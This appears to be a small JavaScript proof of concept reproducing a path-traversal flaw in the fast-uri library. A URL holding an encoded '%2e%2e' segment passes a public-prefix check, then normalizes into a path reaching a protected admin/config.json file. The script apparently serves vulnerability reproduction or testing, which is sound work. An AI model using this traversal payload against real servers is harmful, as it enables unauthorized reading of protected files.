import fastUri from "fast-uri";
import { join } from "node:path";

const publicUrl = "https://assets.example/public/";
const assetUrl = "https://assets.example/public/%2e%2e/admin/config.json";

if (!assetUrl.startsWith(publicUrl)) {
  throw new Error("the exploit URL did not pass the public-prefix policy");
}
const normalized = fastUri.normalize(assetUrl);
const resourcePath = fastUri.parse(normalized).path;
const target = join("asset-store", resourcePath.slice(1));
const expected = join("asset-store", "admin", "config.json");
if (target !== expected) {
  throw new Error(`expected protected target ${expected}, received ${target}`);
}
console.log("vulnerable fast-uri encoded dot-segment escape reproduced");
